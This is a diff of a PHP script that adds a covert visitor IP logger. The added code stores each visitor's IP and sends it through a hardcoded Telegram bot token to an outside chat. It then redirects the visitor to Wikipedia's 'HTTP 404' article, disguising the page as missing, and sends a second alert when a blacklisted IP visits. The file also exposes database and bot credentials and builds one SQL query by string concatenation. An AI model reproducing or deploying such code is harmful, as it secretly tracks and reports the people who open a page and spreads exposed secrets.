@@ -1,10 +1,15 @@
 <?php
 
+try {
 $con = new PDO(
     'mysql:host=127.0.0.1;dbname=dataset_ig',
     'malau',
     'password');
 $con->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+} catch(PDOException $e) {
+  echo $sql . "<br>" . $e->getMessage();
+}
 
 function getip() {
     if (validip($_SERVER["HTTP_CLIENT_IP"])) {
@@ -73,18 +78,48 @@ function check_client($conn, $longip){
   return $res;
 }
 
+function check_blacklist($conn, $longip){
+  $stmt = $conn->prepare("SELECT ipaddr FROM ipblacklist where ipaddr = ".$longip);
+  $stmt->execute();
+
+  $rows = $stmt->fetchAll();
+
+  $res = false;
+
+  foreach($rows as $row) {
+          $res = true;
+          break;
+  }
+
+  return $res;
+}
+
 $ip = getip();
 $longip = ip2long($ip);
-
+ 
 if(!check_client($con, $longip)){
   echo "<h2>".$longip."</h2>";
-  // $stmt = $con->prepare("INSERT INTO ipclient (ipaddr) VALUES (:ipaddr)");
-  // $stmt->bindParam(':ipaddr', $longip);
-  //
-  // $stmt->execute();
+  $stmt = $con->prepare("INSERT INTO ipclient (ipaddr) VALUES (:ipaddr)");
+  $stmt->bindParam(':ipaddr', $longip);
+  
+   $stmt->execute();
+
+   $id = 291134959;
+
+  $path = "https://api.telegram.org/bot1729002504:AAE1uStDPQPf4L3xEVfk_jYHBfOcNSp3fF0/sendmessage?chat_id=".$id."&text=New Ip adress ".$ip;
+
+  $res = file_get_contents($path, true);
+  header('Location: https://en.wikipedia.org/wiki/HTTP_404');
 }
 else{
-  echo "ELSE";
+  echo $longip;
+  if(check_blacklist($con, $longip)){
+	$id = 291134959;
+	$pathblock = "https://api.telegram.org/bot1729002504:AAE1uStDPQPf4L3xEVfk_jYHBfOcNSp3fF0/sendmessage?chat_id=".$id."&text=Blacklist try to access.Ip adress ".$ip;
+	$res = file_get_contents($pathblock, true);
+	sleep(2);
+	header('Location: https://en.wikipedia.org/wiki/HTTP_404');
+  }
 }
 
 
